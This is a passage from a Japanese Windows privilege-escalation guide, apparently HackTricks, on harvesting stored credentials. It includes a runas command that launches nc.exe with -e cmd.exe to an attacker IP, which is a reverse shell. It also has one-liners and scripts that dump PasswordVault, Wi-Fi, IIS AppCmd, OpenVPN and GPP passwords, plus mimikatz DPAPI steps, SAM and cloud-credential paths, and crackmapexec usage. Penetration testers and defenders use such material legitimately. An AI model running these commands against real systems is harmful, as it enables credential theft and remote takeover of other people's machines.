`DefaultUserName` と `DefaultDomainName` は認証情報ではなく、アカウントのコンテキストとして扱います。空でない `DefaultPassword` または `AltDefaultPassword` の値は、レジストリ内に平文で保存された値として検出されます。`AutoAdminLogon=1` でも読み取り可能な平文パスワードがない場合は、手掛かりにすぎません。[Sysinternals Autologon はパスワードを LSA secret として保存することがあります](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon)。通常のレジストリ読み取りだけでは、その secret が存在するか、取得可能かどうかは確認できません。認証情報の漏えいを報告する前に、アクセス権と実際のログオン設定を確認してください。

### Credentials manager / Windows vault

[https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>より\
Windows Vault は、サーバー、Web サイト、その他のプログラム用のユーザー認証情報を保存し、**Windows** がそれを使って**ユーザーを自動的にログインさせる**ことができます。一見すると、Facebook、Twitter、Gmail などのサイトの認証情報を保存して、ブラウザーに自動ログインさせられるように思えるかもしれませんが、そういう仕組みではありません。

Windows Vault は、Windows がユーザーを自動的にログインさせるための認証情報を保存します。つまり、リソース（サーバーや Web サイト）へのアクセスに認証情報を必要とする**Windows アプリケーションは、Credential Manager と Windows Vault を利用**し、ユーザーが毎回ユーザー名とパスワードを入力する代わりに、保存された認証情報を使用できます。

アプリケーションが Credential Manager と連携しない限り、特定のリソース用の認証情報を利用することはできないと思います。そのため、アプリケーションで vault を利用する場合は、何らかの方法で**credential manager と連携し、そのリソースの認証情報を既定の storage vault に要求する**必要があります。

`cmdkey` を使うと、マシンに保存されている認証情報を一覧表示できます。

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

その後、保存された資格情報を使用するために、`/savecred` オプションを指定して `runas` を使えます。以下の例では、SMB share 経由でリモートのバイナリを呼び出しています。

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

提供された一組の認証情報を使って `runas` を実行する。

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

mimikatz、lazagne、[credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html)、[VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html)、または[Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1)を使用します。

### UWP PasswordVault / Credential Locker

最新の Windows UWP アプリケーション、Microsoft Edge、および最新のシステムサービスは、認証トークンと平文パスワードを UWP の `PasswordVault`（`vaultcmd` では `Web Credentials` としても公開されています）内に保存します。このストレージ領域はセッションごとに分離されており、管理者権限や `SeDebugPrivilege` がなくてもネイティブに復号できます。

ユーザーのアクティブなセッション内で次の PowerShell コマンドを実行すると、保存されているユーザー名と平文パスワードをすべて即座にダンプして復号できます。

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API（DPAPI）**は、データを対称暗号化する方法を提供します。主に Windows オペレーティングシステム内で、非対称秘密鍵の対称暗号化に使用されます。この暗号化では、ユーザーまたはシステムのシークレットを利用して、エントロピーを大幅に高めます。

**DPAPIでは、ユーザーのログインシークレットから導出された対称鍵を使って鍵を暗号化できます**。システム暗号化の場合は、システムのドメイン認証シークレットを使用します。

DPAPIを使用して暗号化されたユーザーのRSA鍵は、`%APPDATA%\Microsoft\Protect\{SID}`ディレクトリに保存されます。ここで`{SID}`は、ユーザーの[Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier)を表します。**同じファイル内でユーザーの秘密鍵を保護するマスター鍵とともに保存されているDPAPI鍵**は、通常、64バイトのランダムデータで構成されます。（このディレクトリへのアクセスは制限されているため、CMDの`dir`コマンドでは内容を一覧表示できませんが、PowerShellでは一覧表示できます）。

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

適切な引数（`/pvk` または `/rpc`）を指定して、**mimikatz module** の `dpapi::masterkey` を使用すると復号できます。

**マスターパスワードで保護された認証情報ファイル**は、通常次の場所にあります。

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

**mimikatz module** `dpapi::cred` と適切な `/masterkey` を使って復号できます。\
（root 権限があれば）`sekurlsa::dpapi` module を使って、**memory** から多数の **DPAPI** **masterkeys** を**抽出**できます。


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** は、暗号化された認証情報を手軽に保存する方法として、**スクリプト**や自動化タスクでよく使われます。認証情報は **DPAPI** で保護されており、通常、作成時と同じコンピューター上の同じユーザーでしか復号できません。

エクスポートされた認証情報のファイル名や `.xml` のパスは任意です。スクリプトやファイルのインベントリでファイルが見つかった場合は、`C:\Users` にあると決めつけず、アカウントの実際のプロファイルディレクトリを特定してください。[Windows では、プロファイルを別の場所に配置できます](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory)。ファイルを読み取れることは手掛かりにすぎません。[Windows の `Export-Clixml` は、暗号化された認証情報をエクスポート元のユーザーとコンピューターに紐付けます](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml)。また、復旧したアカウントが対象サービスで有効な権限を持つことも別途確認する必要があります。通常の列挙では、暗号化された値や平文の値を出力せず、まずパスと ACL を確認してください。

ファイルに含まれる PS credentials を**復号**するには、次のようにします。

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wi-Fi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### 保存済み RDP 接続

次の場所で見つけられます。`HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
および `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### 最近実行したコマンド

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **リモート デスクトップ資格情報マネージャー**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Mimikatz の `dpapi::rdg` モジュールと適切な `/masterkey` を使用して、**.rdg ファイルを復号**します\
Mimikatz の `sekurlsa::dpapi` モジュールを使用すると、メモリから多くの DPAPI masterkeys を**抽出**できます

**mRemoteNG は別の接続ストアを使用します。** `%APPDATA%\mRemoteNG` とユーザーの Documents にある読み取り可能な XML を調べます。`config.xml` のような一般的な名前のファイルも対象に含めます。XML ファイルを認証情報の手掛かりとみなす前に、接続スキーマと暗号化された `Password` 属性を特定してください。保存された値は DPAPI/RDCMan のパスワードではありません。復元できるかどうかは、ファイルの暗号化設定とカスタム master password が使用されたかどうかによって異なります。広範な列挙中に暗号化された値を出力しないでください。

**Remote Desktop Plus のプロファイルエクスポート**も、ユーザーディレクトリや共有管理フォルダー内に読み取り可能な状態で保存されている場合があります。従来形式の `profiles.xml` エクスポートには、`ProfileName`、`Password`、`Secure` 要素を持つ `Data/Profile` エントリが含まれます。空でないパスワード要素は、出力したり平文だと決めつけたりせず、認証情報の手掛かりとして扱ってください。[ベンダーの説明](https://www.donkz.nl/)によると、プロファイル保護は作成時のアカウントとコンピューターに紐付けられる場合も、より緩い設定にできる場合もあります。その情報に依存する前に、ファイルの由来と復元条件を確認してください。

### Sticky Notes

Windows ワークステーションでは、データベースファイルだと気づかずに、Sticky Notes アプリに**パスワード**などの情報を保存していることがよくあります。このファイルは `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` にあり、必ず検索して調べる価値があります。

Sticky Notes アプリにパスワードなどの情報を保存する人もいます。Microsoft のパッケージ版 Sticky Notes アプリでは、通常、ノートは `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` に保存されます。古いアプリや別のアプリでは、LevelDB など、ユーザープロファイル内の別のストアが使われることがあります。SQLite ファイルが見つからないことを、ノートが存在しない証拠とみなす前に、インストールされているアプリとストレージ形式を特定してください。

Sticky Notes が SQLite の write-ahead logging を使用している場合、`plum.sqlite` だけをコピーすると、直近にコミットされたノートが含まれない可能性があります。整合性のあるデータベースコピーとともに、対応する `plum.sqlite-wal` も保持してください。利用可能であれば `plum.sqlite-shm` も含めます。共有メモリのインデックスは再構築できますが、WAL はデータベースの永続状態の一部です。[SQLite の WAL ドキュメント](https://www.sqlite.org/wal.html)を参照してください。アカウント名やパスワードを含むノートは、あくまで認証情報の手掛かりです。アカウント、許可されたアクセス権、パスワードの使い回しは、それぞれ別途確認してください。暗号化されたパスワードマネージャーのレコードから上位権限のログインを確認するには、実際の復号キーとアプリケーション固有の解釈も必要です。

### AppCmd.exe

**AppCmd.exe からパスワードを復元するには、Administrator 権限が必要であり、High Integrity レベルで実行する必要があります。**\
**AppCmd.exe** は `%systemroot%\system32\inetsrv\` ディレクトリにあります。\
このファイルが存在する場合、何らかの**認証情報**が設定されており、**復元**できる可能性があります。

このコードは [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) から抽出されました：

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` が存在するか確認します。\
インストーラーは**SYSTEM 権限で実行される**ため、**DLL Sideloading に脆弱な場合があります（情報元:** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**）。**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## ファイルとレジストリ（認証情報）

### サポートツールのレジストリに残る認証情報の痕跡

古いリモートサポートのインストール環境では、固定されたアプリケーションのレジストリキーにパスワード関連の値名が残っていることがあります。たとえば、[ベンダーによるレジストリキーの説明](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988)によると、TeamViewerの`SecurityPasswordAES`はバージョン9より前では設定済みの固定セッションパスワードを示していました。値名のマーカーは調査の手掛かりにすぎません。その認証情報を評価する前に、インストール済みのバージョン、読み取り可能な値データ、その形式、現在の認証動作を確認してください。リモートサポートのパスワードを、より高い権限を持つWindowsアカウントで使えると判断するには、実際にパスワードが再利用されており、そのアカウントへのアクセスが許可されている必要があります。通常の列挙出力に暗号文や復元したパスワードを含めないでください。

### 保護されたシートを含む共有スプレッドシート

読み取り可能な共有ブックにアカウント情報が含まれている可能性がある場合は、**ファイルの暗号化**と、ワークシートの保護や非表示列を区別してください。[Microsoftの説明](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel)によると、ワークシートの保護は編集を制御するものであり、セキュリティ機能ではありません。それだけではブックの内容が暗号化されているとは判断できません。許可された関連ファイルのみを確認し、広範な列挙中に候補となる秘密情報を表示しないでください。読み取り可能な`.xlsx`のパス、保護されたシート、または非表示列があるだけでは、認証情報の存在も、いずれかのアカウントがより高い権限を持つことも証明できません。実際のデータと現在のアカウント権限は、それぞれ別に確認してください。

### CIサーバーに残る変更パッチ

CIサーバーは、ビルド終了後も送信されたソース変更をデータディレクトリに保持している場合があります。[TeamCityの説明](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html)では、`system/changes`はリモート実行の変更を保存する場所です。データディレクトリは設定可能であり、必ずしも`ProgramData`の下にあるとは限りません。読み取り可能なパッチには、削除または追加された認証情報ファイル、暗号化キー、あるいはその両方を使用するスクリプトへの参照が残っていることがあります。たとえば、PowerShellの`ConvertTo-SecureString -Key`を使う処理では、暗号化文字列だけでなくAESキーも必要です。[Microsoftの説明](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring)によると、キーは別途指定します。まずアクセス可能なパッチ名だけを確認し、その後、許可を得て関連する内容を調べてください。通常の列挙出力に秘密情報を表示しないでください。パッチのパス、暗号化された値、またはキーへの参照だけでは、有効な認証情報や高い権限へのアクセスは証明できません。データディレクトリのACLを制限し、ビルドの変更内容に秘密情報をコミットしないでください。

### 独自のローカル管理者パスワードローテーション

自作のパスワードローテーターは、暗号化されたローカル管理者パスワードをローカルサービスに保存する一方、データストアの認証情報を読み取り可能な`.env`ファイルやアップデーターのバイナリの隣に保存している場合があります。アップデーターのスケジュールされたタスク、アカウント、設定ファイルのACL、リスナー、データストアの権限をまとめて確認してください。ループバック限定のデータストアでも、有効な認証情報を持つローカルユーザーからはアクセスできます。ただし、認証に成功しただけでは、関連レコードを読み取る権限があるとは限りません。暗号化シードやキー素材が暗号文の隣から取得できる場合は、暗号化を信頼する前に、正確な鍵導出方法を確認してください。公開されたシードからGoの[`math/rand`](https://pkg.go.dev/math/rand)を使ってAESキーを決定論的に導出する方式は、そのパスワードの保護には適していません。Goのドキュメントでも、このパッケージはセキュリティ上重要な乱数生成には不適切とされています。復元したパスワードを権限昇格経路として扱う前に、そのパスワードが現在も有効であり、ローカルAdministratorsグループのアカウントに属することを確認してください。スケジュールされたタスク、`.env`のパス、暗号化されたデータがあるだけでは、いずれの条件も証明されません。通常の列挙出力にパスワードやキー素材を含めないでください。

管理対象のローカル管理者パスワードには[Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview)を使用してください。ディレクトリまたはEntraを利用した保存先とアクセス制御は、独自のローカルデータストアとは別のものです。同様に、[Elasticsearchのロール](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/)は、認証済みのデータストアユーザーが特定のインデックスを読み取れるかどうかを決定します。

### Javaサーバープラグインのアーカイブと認証情報の再利用

一部のJavaサーバープラグインは、サーバーの`plugins`ディレクトリにJARアーカイブとして配布されています。読み取り可能なカスタムプラグインには、設定情報や埋め込みサービス認証情報を含むバイトコードが含まれている場合があります。許可されている場合に限りアーカイブを確認し、復元した秘密情報を通常の列挙出力に含めないでください。プラグインのパスだけでは秘密情報の存在は証明できません。また、サービスのパスワードを復元しても、それがより高い権限を持つアカウントでも有効な場合に限り、権限昇格につながります。関連ファイルのACLを確認し、再利用された認証情報をそれぞれ異なる秘密情報に置き換えてください。ディレクトリ構成については[PaperMCのプラグインインストールガイド](https://docs.papermc.io/paper/adding-plugins/)、アーカイブの内容については[OracleのJARドキュメント](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html)を参照してください。

### Openfireの組み込みデータベース認証情報

組み込みデータベースを使用するOpenfireのインストール環境では、`Openfire\embedded-db`の下に`openfire.script`が保存されている場合があります。現在のアカウントで読み取れる場合は、`OFUSER`レコードと`passwordKey`プロパティを併せて確認してください。Openfireの[ユーザープロバイダーのドキュメント](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html)によると、パスワードは平文またはそのプロパティに保持されたキーで暗号化して保存できます。復元したパスワードが権限昇格につながるのは、より高い権限を持つIDで現在も有効な場合に限られます。ファイル名だけでは、読み取りアクセスも認証情報の再利用も証明できません。このパスは調査の手掛かりとして扱い、通常の列挙出力にデータベースの内容や認証情報を含めないでください。

別ファイルの`Openfire\conf\openfire.xml`からは、外部データベースを使用している場合でも、管理コンソールの設定ポートとバインドインターフェースが分かることがあります。Openfireの管理コンソールは通常ループバックにバインドされますが、リスナーが動作していれば、ローカルアカウントからそのアドレスに接続できます。実際のリスナー、許可された管理者ロール、プラグインのアップロードポリシー、OpenfireのサービスIDをまとめて確認してください。プラグインをインストールできる管理者は、サービスのコンテキストでプラグインコードを実行させることができます。サービスがLocalSystemとして動作している場合、その権限は非常に高い可能性があります。アカウントのパスワードが一致することや、設定ファイルのパスが読み取り可能であることだけでは、管理コンソールへのアクセスもコード実行も証明できません。ベンダーの[インストールおよびプラグイン管理ガイド](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html)と[プラグインアップロードAPIのプロパティ](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html)を参照してください。

### フォレンジック管理サーバーの設定

Velociraptorサーバーの設定ファイルは、一般に`server.config.yaml`という名前で、内部CAの`CA.private_key`を含むことがあります。権限の低いユーザーがそのキーを読み取れる場合、APIクライアント証明書を発行できる可能性があります。それが高い権限につながるかどうかは、サーバー上のユーザーロール、APIへの到達性、サーバーまたは対象エージェントが実行されるIDによって異なります。クライアント設定には別の情報が含まれます。クライアント設定が見つかっても、サーバーCAへのアクセスがあるとは限りません。CA秘密鍵をオフラインで保管する環境もあるため、読み取り可能なサーバー設定に署名用キーが含まれていないこともあります。

Windowsサーバーでは、インストールディレクトリにある**サーバー**設定と、保護されたバックアップのACLを確認してください。場所の例は`%ProgramFiles%\VelociraptorServer\server.config.yaml`です。パスが異なる場合は、サービスに設定されたパスを使用してください。現在のIDでファイルを読み取れることと、実際に`CA.private_key`が含まれていることを確認してください。ログや列挙出力に秘密鍵を表示しないでください。ベンダーの`config api_client`ワークフローでは、CAキーを使ってクライアント証明書を発行しますが、有効なサーバー側ロールも必要です。ロールの作成や変更には、データストアへの書き込み権限または再起動が必要になる場合があります。これらの変更ができなくても、既存の高権限サーバーIDが経路となる可能性があります。実行権限を伴うAPIクエリは、関連するサーバーまたはエージェントのコンテキストで実行され、非常に高い権限を持つ場合があります。

サーバー設定とバックアップは制限的なACLで保護し、可能であればCA署名キーをオフラインで保管し、APIロールとリスナーへのアクセスを制限してください。[Velociraptor APIドキュメント](https://docs.velociraptor.app/docs/server_automation/server_api/)および[セキュリティ設定ガイダンス](https://docs.velociraptor.app/docs/deployment/security/)を参照してください。

### Putty認証情報

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTYは独立したセッションマネージャーです。ネイティブの暗号化ストアは`%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`にある場合があります。一方、エクスポートされたセッションのバックアップは`sessions-backup.dat`という名前で、別の場所に保存されている場合があります。[SolarWindsのエクスポートガイド](https://thwack.solarwinds.com/discussion/comment/115591)によると、エクスポートファイルはパスワードで暗号化されており、セッション、キー、スクリプト、タグ、関連情報を含むことがあります。[サポートフォーラム](https://thwack.solarwinds.com/discussion/4520/saved-session-lost)では、ネイティブストアの場所が示されています。まずファイルのアクセス許可とパスを確認してください。いずれかのファイルが見つかっても、そのパスワードが判明するわけではなく、保存された認証情報が現在も有効であることや、より高い権限を持つことの証明にもなりません。

### PuTTY SSHホストキー

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### レジストリ内の SSH keys

SSH private keys はレジストリキー `HKCU\Software\OpenSSH\Agent\Keys` に保存されている場合があるため、興味深いものがないか確認してください。

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

そのパス内にエントリがあれば、保存された SSH key である可能性が高いです。暗号化されていますが、[https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) を使えば簡単に復号できます。\
この手法の詳細はこちら: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

`ssh-agent` サービスが実行されておらず、起動時に自動で開始させたい場合は、次を実行します:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> この手法は現在は使えないようです。ssh keysを作成し、`ssh-add`で追加してから、ssh経由でマシンにログインしようとしました。レジストリのHKCU\Software\OpenSSH\Agent\Keysは存在せず、procmonでも非対称鍵認証中に`dpapi.dll`が使用されていることは確認できませんでした。

### 無人インストールファイル

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

**metasploit**を使って、これらのファイルを検索することもできます: _post/windows/gather/enum_unattend_

例の内容:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### SAM & SYSTEM のバックアップ

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

読み取り可能な Windows Imaging (`.wim`) バックアップファイルには、オフラインの `SAM`、`SECURITY`、`SYSTEM` ハイブが含まれている場合もあります。ローカルからアクセスできるバックアップまたはイメージのディレクトリを優先して確認し、何かを展開する前にイメージの**メンバー名**を調べてください。`.wim` というファイル名だけではハイブが露出している証拠にはならず、通常の `install.wim`、`boot.wim`、およびリカバリーイメージは、よくある誤った手掛かりです。SMB share は別のアクセス経路であり、その share がスコープ内にある場合にのみ確認してください。Microsoft の [Windows image guidance](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) と [registry hive file reference](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives) を参照してください。

### クラウド認証情報

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

**SiteList.xml**というファイルを検索します。

### Cached GPP Password

以前は、Group Policy Preferences（GPP）を介して、複数のマシンにカスタムのローカル管理者アカウントを展開できる機能がありました。しかし、この方法には重大なセキュリティ上の欠陥がありました。まず、SYSVOLにXMLファイルとして保存されているGroup Policy Objects（GPO）は、ドメインユーザーであれば誰でもアクセスできました。次に、GPP内のパスワードは、公開されているデフォルトキーを使ってAES256で暗号化されていましたが、認証済みユーザーであれば誰でも復号できました。ユーザーが昇格した権限を取得する可能性があるため、これは深刻なリスクとなっていました。

このリスクを軽減するため、空ではない「cpassword」フィールドを含むローカルキャッシュ済みGPPファイルをスキャンする関数が開発されました。そのようなファイルが見つかると、関数はパスワードを復号し、カスタムのPowerShellオブジェクトを返します。このオブジェクトには、GPPの詳細とファイルの場所が含まれており、このセキュリティ脆弱性の特定と修正に役立ちます。

次のファイルを、`C:\ProgramData\Microsoft\Group Policy\history` または _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vistaより前)_ で検索します。

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPasswordを復号するには:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

crackmapexecを使ってパスワードを取得する：

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

認証情報を含む web.config の例:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### IIS webroot 内のバックアップアーカイブ

配信対象の webroot に直接置かれた古い ZIP バックアップから、以前の設定ファイルや再利用可能な認証情報が漏えいする可能性があります。露出と判断する前に、サイトに設定された物理パスを確認し、アーカイブに HTTP 経由で実際にアクセスできるかどうかを確かめてください。デフォルトの `C:\inetpub\wwwroot` は候補の一つにすぎません。アーカイブを開かずに名前とサイズを一覧表示するには、簡単なローカルインベントリを実行できます。

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

アーカイブ名だけでは、秘密情報が含まれていることや、回収した認証情報でより高い権限が得られることは証明できません。

### OpenVPNの認証情報

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### ログ

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### 認証情報を尋ねる

ユーザーが知っていると思われる場合は、**ユーザー自身の認証情報、あるいは別のユーザーの認証情報を入力するよう、いつでも尋ねることができます**（クライアントに**認証情報**を直接尋ねるのは、非常に**リスクが高い**ことに注意してください）。

```bash
